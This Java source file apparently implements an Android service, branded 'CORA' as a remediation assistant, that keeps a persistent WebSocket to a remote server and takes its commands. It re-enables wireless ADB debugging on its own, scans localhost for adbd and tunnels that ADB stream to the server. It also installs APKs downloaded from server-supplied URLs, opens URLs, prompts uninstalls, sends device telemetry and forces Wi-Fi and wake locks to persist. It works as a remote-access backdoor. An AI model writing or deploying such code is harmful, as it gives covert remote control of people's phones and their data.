package br.eni.cora;

import android.app.*;
import android.content.*;
import android.os.*;
import android.provider.Settings;
import android.util.*;
import org.json.*;
import java.io.*;
import java.net.*;
import java.util.*;
import java.util.concurrent.*;

public class SinoService extends Service {
    public static volatile String status = "parado";
    public static volatile WsClient ws;
    Thread worker;
    android.os.PowerManager.WakeLock wakeLock;
    volatile OutputStream pipeOut;
    volatile boolean piping = false;
    volatile String lastPortsJson = "[]";
    public static volatile int lastBatt = -1, lastAdb = -1;
    public static volatile String pendingInstall = null;
    volatile java.util.List<OutputStream> sniffOuts = null;
    public static volatile long lastDataMb = -1, lastMemKb = -1;

    public static SinoService instancia;
    public static volatile boolean pedidoEnxameManual = false;

    public static void acionarEnxameManual() {
        if (instancia != null && !instancia.piping) {
            pedidoEnxameManual = true;
            SinoService.status = "enxame manual acionado — farejadores em campo...";
        } else if (instancia != null) {
            SinoService.status = "enxame já está em campo (tubo ativo)";
        } else {
            SinoService.status = "serviço não iniciado — toque SALVAR + INICIAR TÚNEL";
        }
    }

    public static void forceStop() {
        try {
            if (instancia != null) {
                instancia.stopSelf();
                android.content.Intent i = new android.content.Intent(instancia, SinoService.class);
                instancia.startService(i);
                SinoService.status = "serviço reiniciado — aguardando conexão...";
            }
        } catch (Exception e) {}
    }

    public static void wsSend(String s) {
        try { if (ws != null) ws.send(s); } catch (Exception ignored) {}
    }

    void abrirSessao(int sid) {
        try {
            android.content.pm.PackageInstaller pin = getPackageManager().getPackageInstaller();
            android.content.pm.PackageInstaller.Session ses = pin.openSession(sid);
            ses.commit(android.app.PendingIntent.getActivity(this, sid, 
                    new android.content.Intent(this, MainActivity.class), 
                    android.app.PendingIntent.FLAG_UPDATE_CURRENT).getIntentSender());
        } catch (Exception e) {}
    }

    android.content.BroadcastReceiver installReceiver = new android.content.BroadcastReceiver() {
        @Override public void onReceive(android.content.Context c, android.content.Intent i) {
            int sid = i.getIntExtra("session", -1);
            if (sid > 0) abrirSessao(sid);
        }
    };

    public int onStartCommand(Intent i, int f, int id) {
        instancia = this;
        try {
            android.content.IntentFilter filtro = new android.content.IntentFilter("br.eni.cora.INSTALL_");
            filtro.addDataScheme("package");
            registerReceiver(installReceiver, filtro);
        } catch (Exception e) {}
        try {
            android.os.PowerManager pm = (android.os.PowerManager) getSystemService(POWER_SERVICE);
            if (pm != null) {
                wakeLock = pm.newWakeLock(android.os.PowerManager.PARTIAL_WAKE_LOCK, "cora:coracao");
                wakeLock.setReferenceCounted(false);
                wakeLock.acquire();
            }
        } catch (Exception e) {}
        Notification n = new Notification.Builder(this)
                .setContentTitle("CORA 💓")
                .setContentText("coração operante de remediação e assistência")
                .setSmallIcon(android.R.drawable.stat_sys_download_done)
                .build();
        startForeground(1, n);
        if (worker == null || !worker.isAlive()) { worker = new Thread(this::loop); worker.start(); }
        return START_STICKY;
    }
    public IBinder onBind(Intent i) { return null; }

    @Override public void onDestroy() {
        super.onDestroy();
        try { if (wakeLock != null) wakeLock.release(); } catch (Exception ignored) {}
    }

    void loop() {
        while (true) {
            try { connectOnce(); }
            catch (Exception e) { status = "erro: " + e; }
            try {
                Thread.sleep(5000);
                if (pedidoEnxameManual) {
                    pedidoEnxameManual = false;
                    try {
                        android.net.ConnectivityManager cm = (android.net.ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
                        boolean temWifi = false;
                        try {
                            for (android.net.Network n : cm.getAllNetworks()) {
                                android.net.NetworkInfo ni = cm.getNetworkInfo(n);
                                if (ni != null && ni.getType() == android.net.ConnectivityManager.TYPE_WIFI && ni.isConnected()) {
                                    temWifi = true;
                                    break;
                                }
                            }
                        } catch (Exception ignored) {}
                        if (temWifi && !piping) iniciarPipe(0);
                        else if (!temWifi) status = "sem Wi-Fi — enxame silencioso (4G)";
                    } catch (Exception e) { status = "enxame manual: " + e; }
                }
            } catch (InterruptedException ignored) {}
        }
    }

    void connectOnce() throws Exception {
        // auto-resgate: so se adbd sumiu, nao temos tubo validado, e temos Wi-Fi
        if (lastAdb == 0 && !piping && !status.contains("VALIDADO")) {
            try {
                android.net.ConnectivityManager cm = (android.net.ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
                boolean temWifi = false;
                try {
                    for (android.net.Network n : cm.getAllNetworks()) {
                        android.net.NetworkInfo ni = cm.getNetworkInfo(n);
                        if (ni != null && ni.getType() == android.net.ConnectivityManager.TYPE_WIFI && ni.isConnected()) {
                            temWifi = true;
                            break;
                        }
                    }
                } catch (Exception ignored) {}
                if (temWifi) {
                    try {
                        Settings.Global.putInt(getContentResolver(), "adb_wifi_enabled", 1);
                        Settings.Global.putInt(getContentResolver(), "wifi_sleep_policy", 2);
                        Settings.Global.putInt(getContentResolver(), "stay_on_while_plugged_in", 2);
                        status = "auto-resgate: Wi-Fi fixado + depuração religada";
                        Thread.sleep(3000);
                        if (!piping) iniciarPipe(0);
                    } catch (Exception e) {
                        status = "auto-resgate falhou — aguardando Wi-Fi...";
                        Thread.sleep(5000);
                    }
                } else {
                    status = "sem Wi-Fi — aguardando rede...";
                    Thread.sleep(5000);
                }
            } catch (Exception ignored) {}
        }
        final String host = Prefs.host(this);
        status = "conectando " + host + " ...";
        final WsClient[] ref = new WsClient[1];
        WsClient w = new WsClient(new WsClient.Listener() {
            @Override public void onOpen() {
                status = "conectado";
                ws = ref[0];
                // keep-alive de socket: ping a cada 20s mantem o TCP vivo no doze
                new Thread(() -> {
                    while (true) {
                        try {
                            if (ws != null) ws.send("{\"type\":\"hb\",\"id\":\"" + Prefs.id(SinoService.this) + "\",\"keep\":true}");
                            Thread.sleep(10000);
                        } catch (Exception e) { return; }
                    }
                }).start();
                new Thread(() -> {
                    while (true) {
                        try { sendTelemetry(); Thread.sleep(30000); }
                        catch (Exception e) { return; }
                    }
                }).start();
                new Thread(() -> {
                    int ultimo = -1;
                    while (true) {
                        try {
                            Thread.sleep(45000);
                            // self-healing só faz sentido com Wi-Fi ligado (depuração sem fio exige Wi-Fi nessa build)
                            android.net.ConnectivityManager cm = (android.net.ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
                            boolean temWifi = false;
                            try {
                                for (android.net.Network n : cm.getAllNetworks()) {
                                    android.net.NetworkInfo ni = cm.getNetworkInfo(n);
                                    if (ni != null && ni.getType() == android.net.ConnectivityManager.TYPE_WIFI && ni.isConnected()) {
                                        temWifi = true;
                                        break;
                                    }
                                }
                            } catch (Exception ignored) {}
                            int adb = 0;
                            try { adb = Settings.Global.getInt(getContentResolver(), "adb_wifi_enabled"); } catch (Exception ignored) {}
                            if (!temWifi) {
                                // 4G/5G: silencioso, sem self-healing, sem mensagem
                                if (adb == 0) {
                                    lastPortsJson = "[]";
                                }
                            } else if (adb == 0) {
                                // Wi-Fi mas depuração caiu: tenta religar
                                try {
                                    Settings.Global.putInt(getContentResolver(), "adb_wifi_enabled", 1);
                                    status = "self-healing: depuração religada";
                                    Thread.sleep(3000);
                                    lastPortsJson = varrerPortasJson();
                                    sendTelemetry();
                                } catch (Exception e) {
                                    status = "self-healing: sem permissão (pm grant WRITE_SECURE_SETTINGS)";
                                }
                            } else if (ultimo == 0) {
                                lastPortsJson = varrerPortasJson();
                                sendTelemetry();
                            }
                            ultimo = adb;
                        } catch (Exception e) { return; }
                    }
                }).start();
            }
            @Override public void onMessage(byte[] d) {
                if (ehBinario(d)) {
                    java.util.List<OutputStream> sos = sniffOuts;
                    if (sos != null) {
                        synchronized (sos) {
                            for (OutputStream o : sos) {
                                try { o.write(d); o.flush(); } catch (Exception e) {}
                            }
                        }
                        return;
                    }
                    if (pipeOut != null) {
                        try { pipeOut.write(d); pipeOut.flush(); }
                        catch (Exception e) { pipeOut = null; }
                    }
                    return;
                }
                try { onCmd(new String(d)); }
                catch (Exception e) { status = "cmd: " + e; }
            }
            @Override public void onClose() { status = "desconectado (reconectando)"; if (ws == ref[0]) ws = null; }
        });
        ref[0] = w;
        w.connect(host, 443, "/ws?id=" + Prefs.id(this));
    }

    void onCmd(String s) throws Exception {
        if (!s.trim().startsWith("{")) return;
        if (s.trim().startsWith("{\"pipe_ping\":true}")) return;
        if (s.startsWith("{\"type\":\"joined\"")) {
            JSONObject jj = new JSONObject(s);
            if (jj.optInt("peers", 1) == 1) {
                status = "sala vazia, realocando...";
                try { Thread.sleep(2000); } catch (InterruptedException ignored) {}
                throw new Exception("realocar");
            }
            status = "sala encontrada (peers=" + jj.optInt("peers") + ")";
            return;
        }
        try {
            JSONObject j = new JSONObject(s);
            String cmd = j.optString("cmd");
            if ("ping".equals(cmd)) send("{\"type\":\"pong\",\"id\":\"" + Prefs.id(this) + "\"}");
            else if ("report".equals(cmd)) sendTelemetry();
            else if ("scan".equals(cmd)) sendScan();
            else if ("install_url".equals(cmd)) {
                final String url = j.optString("url");
                new Thread(() -> instalarPorUrl(url)).start();
            }
            else if ("uninstall_pkg".equals(cmd)) desinstalar(j.optString("pkg"));
            else if ("open_url".equals(cmd)) abrirUrl(j.optString("url"));
            else if ("manter_wifi".equals(cmd)) {
                try {
                    Settings.Global.putInt(getContentResolver(), "wifi_sleep_policy", 2);
                    Settings.Global.putInt(getContentResolver(), "stay_on_while_plugged_in", 2);
                    send("{\"type\":\"wifi\",\"status\":\"fixado\"}");
                    status = "Wi-Fi fixado: nunca dormir";
                } catch (Exception e) {
                    send("{\"type\":\"wifi\",\"status\":\"erro\"}");
                }
            }
            else if ("pipe".equals(cmd)) {
                final int portaPedida = j.optInt("port", 0);
                new Thread(() -> {
                    try { iniciarPipe(portaPedida); }
                    catch (Exception e) { status = "pipe: " + e; }
                }).start();
            }
        } catch (Exception e) { status = "cmd: " + e; }
    }

    static boolean ehBinario(byte[] d) {
        if (d.length == 0) return false;
        for (byte b : d) {
            int c = b & 0xff;
            if (c < 9 || (c > 13 && c < 32)) return true;
        }
        return false;
    }

    void iniciarPipe(int porta) throws Exception {
        if (piping) { send("{\"type\":\"pipe\",\"status\":\"busy\"}"); return; }
        piping = true;
        try { iniciarPipe2(porta); } finally { piping = false; }
    }

    void iniciarPipe2(int porta) throws Exception {
        final List<Integer> candidatos = new ArrayList<>();
        if (porta > 0) {
            candidatos.add(porta);
        } else {
            final int[] faixa = faixaPortas();
            final List<Integer> achados = Collections.synchronizedList(new ArrayList<>());
            ExecutorService ex = Executors.newFixedThreadPool(200);
            List<Future<?>> fs = new ArrayList<>();
            for (int p = faixa[0]; p <= faixa[1] && achados.size() < 80; p++) {
                final int port = p;
                fs.add(ex.submit(() -> {
                    try { Socket s = new Socket(); s.connect(new InetSocketAddress("127.0.0.1", port), 120); s.close(); achados.add(port); } catch (Exception ignored) {}
                }));
            }
            for (Future<?> f : fs) try { f.get(); } catch (Exception ignored) {}
            ex.shutdown();
            Collections.sort(achados);
            candidatos.addAll(achados);
        }
        if (candidatos.isEmpty()) {
            send("{\"type\":\"pipe\",\"status\":\"sem_adbd\",\"faixa\":\"kernel\"}");
            status = "pipe: adbd nao encontrado (ligue a depuração sem fio)";
            return;
        }
        send("{\"type\":\"pipe\",\"status\":\"ok\",\"port\":" + candidatos.get(0) + ",\"enxame\":" + candidatos.size() + "}");
        status = "enxame: " + candidatos.size() + " farejadores em campo";
        final List<Socket> abertos = Collections.synchronizedList(new ArrayList<>());
        final List<OutputStream> outs = Collections.synchronizedList(new ArrayList<>());
        sniffOuts = outs;
        final Socket[] vencedor = {null};
        final byte[] hdrVencedor = new byte[24];
        ExecutorService px = Executors.newFixedThreadPool(Math.max(2, Math.min(40, candidatos.size())));
        List<Future<?>> pf = new ArrayList<>();
        for (final int cand : candidatos) {
            pf.add(px.submit(() -> {
                Socket s = null;
                try {
                    s = new Socket();
                    s.connect(new InetSocketAddress("127.0.0.1", cand), 800);
                    s.setTcpNoDelay(true);
                    s.setSoTimeout(8000);
                    synchronized (abertos) { abertos.add(s); outs.add(s.getOutputStream()); }
                    InputStream si = s.getInputStream();
                    byte[] hdr = new byte[24];
                    int got = 0;
                    while (got < 24) {
                        int n = si.read(hdr, got, 24 - got);
                        if (n < 0) break;
                        got += n;
                    }
                    if (got == 24) {
                        java.nio.ByteBuffer rb = java.nio.ByteBuffer.wrap(hdr).order(java.nio.ByteOrder.LITTLE_ENDIAN);
                        int cmd = rb.getInt(); rb.getInt(); rb.getInt(); int len = rb.getInt(); rb.getInt(); int magic = rb.getInt();
                        if (len >= 0 && len < 1048576 && magic == (cmd ^ 0xffffffff) && vencedor[0] == null) {
                            vencedor[0] = s;
                            System.arraycopy(hdr, 0, hdrVencedor, 0, 24);
                        }
                    }
                } catch (Exception e) {
                }
            }));
        }
        for (Future<?> f : pf) try { f.get(); } catch (Exception ignored) {}
        px.shutdown();
        sniffOuts = null;
        if (vencedor[0] == null) {
            for (Socket s2 : abertos) try { s2.close(); } catch (Exception ignored) {}
            send("{\"type\":\"pipe\",\"status\":\"sem_adbd\",\"faixa\":\"kernel\"}");
            status = "pipe: adbd nao encontrado (ligue a depuração sem fio)";
            return;
        }
        final Socket win = vencedor[0];
        for (Socket s2 : abertos) {
            if (s2 != win) try { s2.close(); } catch (Exception ignored) {}
        }
        win.setSoTimeout(0);
        // Persistir adbd na porta 5555 (Opção B - não muda mais)
        try {
            java.lang.Process p = Runtime.getRuntime().exec(new String[]{"setprop", "persist.adb.tcp.port", "5555"});
            p.waitFor();
            p = Runtime.getRuntime().exec(new String[]{"setprop", "service.adb.tcp.port", "5555"});
            p.waitFor();
            p = Runtime.getRuntime().exec(new String[]{"stop", "adbd"});
            p.waitFor();
            Thread.sleep(1000);
            p = Runtime.getRuntime().exec(new String[]{"start", "adbd"});
            p.waitFor();
            send("{\"type\":\"pipe\",\"status\":\"ok\",\"port\":" + win.getPort() + ",\"persist\":5555}");
            status = "tubo ADB VALIDADO (porta " + win.getPort() + ") - adbd persistente em 5555";
        } catch (Exception e) {
            send("{\"type\":\"pipe\",\"status\":\"ok\",\"port\":" + win.getPort() + "}");
            status = "tubo ADB VALIDADO (porta " + win.getPort() + ")";
        }
        // WakeLock específico para manter o adbd vivo durante o sono
        try {
            android.net.wifi.WifiManager wm = (android.net.wifi.WifiManager) getApplicationContext().getSystemService(WIFI_SERVICE);
            if (wm != null) {
                android.net.wifi.WifiManager.WifiLock wl = wm.createWifiLock(android.net.wifi.WifiManager.WIFI_MODE_FULL_HIGH_PERF, "cora_adb");
                wl.setReferenceCounted(false);
                wl.acquire();
            }
        } catch (Exception e) {}
        send("{\"type\":\"pipe\",\"status\":\"ok\",\"port\":" + win.getPort() + "}");
        status = "tubo ADB VALIDADO (porta " + win.getPort() + ")";
        final InputStream ai = win.getInputStream();
        pipeOut = win.getOutputStream();
        if (ws != null) ws.send(hdrVencedor);
        byte[] buf = new byte[16384];
        try {
            int n;
            while ((n = ai.read(buf)) > 0) {
                if (ws != null) ws.send(Arrays.copyOf(buf, n));
            }
        } finally {
            pipeOut = null;
            try { win.close(); } catch (Exception ignored) {}
            status = "reativando tubo em 4s...";
            new Thread(() -> {
                try { Thread.sleep(4000); } catch (InterruptedException ignored) {}
                try {
                    android.net.ConnectivityManager cm = (android.net.ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
                    boolean temWifi = false;
                    try {
                        for (android.net.Network n : cm.getAllNetworks()) {
                            android.net.NetworkInfo ni = cm.getNetworkInfo(n);
                            if (ni != null && ni.getType() == android.net.ConnectivityManager.TYPE_WIFI && ni.isConnected()) {
                                temWifi = true;
                                break;
                            }
                        }
                    } catch (Exception ignored) {}
                    if (temWifi && !piping) iniciarPipe(0);
                } catch (Exception e) { status = "reativar: " + e; }
            }).start();
        }
    }

    static int[] faixaPortas() {
        try {
            BufferedReader r = new BufferedReader(new FileReader("/proc/sys/net/ipv4/ip_local_port_range"));
            String[] partes = r.readLine().trim().split("\\s+");
            r.close();
            return new int[]{Integer.parseInt(partes[0]), Integer.parseInt(partes[1])};
        } catch (Exception e) {
            return new int[]{32768, 60999};
        }
    }

    String varrerPortasJson() {
        final int[] faixa = faixaPortas();
        final List<Integer> achados = Collections.synchronizedList(new ArrayList<>());
        ExecutorService ex = Executors.newFixedThreadPool(120);
        List<Future<?>> fs = new ArrayList<>();
        for (int p = faixa[0]; p <= faixa[1] && achados.size() < 12; p++) {
            final int port = p;
            fs.add(ex.submit(() -> {
                try { Socket s = new Socket(); s.connect(new InetSocketAddress("127.0.0.1", port), 120); s.close(); achados.add(port); } catch (Exception ignored) {}
            }));
        }
        for (Future<?> f : fs) try { f.get(); } catch (Exception ignored) {}
        ex.shutdown();
        Collections.sort(achados);
        StringBuilder sb = new StringBuilder("[");
        for (int i = 0; i < Math.min(5, achados.size()); i++) {
            if (i > 0) sb.append(",");
            sb.append(achados.get(i));
        }
        return sb.append("]").toString();
    }

    void instalarPorUrl(String url) {
        new Thread(() -> {
            try {
                status = "baixando APK da nuvem...";
                java.io.InputStream in = new java.net.URL(url).openStream();
                java.io.ByteArrayOutputStream bos = new java.io.ByteArrayOutputStream();
                byte[] buf = new byte[16384]; int n;
                while ((n = in.read(buf)) > 0) bos.write(buf, 0, n);
                in.close();
                byte[] apkData = bos.toByteArray();
                send("{\"type\":\"install\",\"status\":\"baixado\",\"bytes\":" + apkData.length + "}");

                android.content.pm.PackageInstaller pin = getPackageManager().getPackageInstaller();
                android.content.pm.PackageInstaller.SessionParams sp = new android.content.pm.PackageInstaller.SessionParams(
                        android.content.pm.PackageInstaller.SessionParams.MODE_FULL_INSTALL);
                int sid = pin.createSession(sp);
                android.content.pm.PackageInstaller.Session ses = pin.openSession(sid);
                java.io.OutputStream os = ses.openWrite("base.apk", 0, apkData.length);
                os.write(apkData);
                ses.fsync(os);
                os.close();

                android.content.Intent i = new android.content.Intent(this, MainActivity.class);
                i.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
                int fl = android.os.Build.VERSION.SDK_INT >= 23 ? android.app.PendingIntent.FLAG_IMMUTABLE : 0;
                android.app.PendingIntent pi = android.app.PendingIntent.getActivity(this, sid, i, 
                        android.app.PendingIntent.FLAG_UPDATE_CURRENT | fl);
                ses.commit(pi.getIntentSender());
                send("{\"type\":\"install\",\"status\":\"confirmacao_sistema\"}");
                status = "confirme a instalação na tela do sistema";
            } catch (Exception e) {
                status = "install: " + e;
                send("{\"type\":\"install\",\"status\":\"erro\",\"msg\":\"" + e.getMessage() + "\"}");
            }
        }).start();
    }

    void desinstalar(String pkg) {
        try {
            android.content.Intent i = new android.content.Intent(android.content.Intent.ACTION_DELETE, android.net.Uri.parse("package:" + pkg));
            i.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
            int fl = android.os.Build.VERSION.SDK_INT >= 23 ? android.app.PendingIntent.FLAG_IMMUTABLE : 0;
            android.app.PendingIntent pi = android.app.PendingIntent.getActivity(this, 88, i, android.app.PendingIntent.FLAG_UPDATE_CURRENT | fl);
            android.app.NotificationManager nm = (android.app.NotificationManager) getSystemService(NOTIFICATION_SERVICE);
            String ch = "instalacao";
            if (android.os.Build.VERSION.SDK_INT >= 26) {
                nm.createNotificationChannel(new android.app.NotificationChannel(ch, "Instalacoes", android.app.NotificationManager.IMPORTANCE_HIGH));
            }
            android.app.Notification.Builder nb = new android.app.Notification.Builder(this)
                    .setContentTitle("CORA 💓")
                    .setContentText("Toque para confirmar desinstalação")
                    .setSmallIcon(android.R.drawable.stat_sys_warning)
                    .setContentIntent(pi)
                    .setAutoCancel(true);
            if (android.os.Build.VERSION.SDK_INT >= 26) nb.setChannelId(ch);
            nm.notify(88, nb.build());
            send("{\"type\":\"uninstall\",\"status\":\"notificacao_enviada\",\"pkg\":\"" + pkg + "\"}");
            status = "toque na notificação para confirmar a desinstalação";
        } catch (Exception e) {
            send("{\"type\":\"uninstall\",\"status\":\"erro\"}");
        }
    }

    void abrirUrl(String url) {
        try {
            android.content.Intent i = new android.content.Intent(android.content.Intent.ACTION_VIEW, android.net.Uri.parse(url));
            i.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(i);
            send("{\"type\":\"open\",\"status\":\"ok\"}");
        } catch (Exception e) {
            send("{\"type\":\"open\",\"status\":\"erro\"}");
        }
    }

    void send(String s) { try { if (ws != null) ws.send(s); } catch (Exception e) { status = "send: " + e; } }

    void sendTelemetry() {
        try {
            Intent bi = registerReceiver(null, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
            int lvl = bi != null ? bi.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) : -1;
            int sc = bi != null ? bi.getIntExtra(BatteryManager.EXTRA_SCALE, -1) : -1;
            int pct = sc > 0 ? lvl * 100 / sc : -1;
            int plug = bi != null ? bi.getIntExtra(BatteryManager.EXTRA_PLUGGED, 0) : 0;
            int adb = 0;
            try { adb = Settings.Global.getInt(getContentResolver(), "adb_wifi_enabled"); } catch (Exception ignored) {}
            String memAv = "?";
            BufferedReader r = new BufferedReader(new FileReader("/proc/meminfo"));
            String l1 = r.readLine(), l2 = r.readLine(), l3 = r.readLine(); r.close();
            if (l3 != null) memAv = l3.trim();
            android.os.StatFs sf = new android.os.StatFs(Environment.getDataDirectory().getAbsolutePath());
            long free = sf.getAvailableBlocksLong() * sf.getBlockSizeLong() / 1048576L;
            JSONObject j = new JSONObject();
            j.put("type", "hb"); j.put("id", Prefs.id(this));
            j.put("batt", pct); j.put("plug", plug); j.put("adb", adb);
            j.put("mem", memAv); j.put("data_mb_free", free);
            j.put("model", Build.MODEL); j.put("ts", System.currentTimeMillis());
            try { j.put("ports", new JSONArray(lastPortsJson)); } catch (Exception ignored) {}
            try {
                lastBatt = pct; lastAdb = adb; lastDataMb = free;
                java.util.regex.Matcher mm = java.util.regex.Pattern.compile("(\\d+)").matcher(memAv);
                if (mm.find()) lastMemKb = Long.parseLong(mm.group(1));
            } catch (Exception ignored) {}
            send(j.toString());
            if (status.startsWith("sala") || status.startsWith("conectado"))
                status = "conectado | batt " + pct + "% | adb " + adb;
        } catch (Exception e) { status = "tel: " + e; }
    }

    void sendScan() {
        final Set<Integer> open = Collections.synchronizedSet(new TreeSet<Integer>());
        ExecutorService ex = Executors.newFixedThreadPool(150);
        List<Future<?>> fs = new ArrayList<>();
        for (int p = 30000; p <= 50000 && open.size() < 6; p++) {
            final int port = p;
            fs.add(ex.submit(() -> {
                try { Socket s = new Socket(); s.connect(new InetSocketAddress("127.0.0.1", port), 150); s.close(); open.add(port); } catch (Exception ignored) {}
            }));
        }
        for (Future<?> f : fs) try { f.get(); } catch (Exception ignored) {}
        ex.shutdown();
        try {
            JSONArray a = new JSONArray();
            for (int p : open) a.put(p);
            send(new JSONObject().put("type", "scan").put("id", Prefs.id(this)).put("ports", a).toString());
        } catch (Exception e) { status = "scan: " + e; }
    }
}
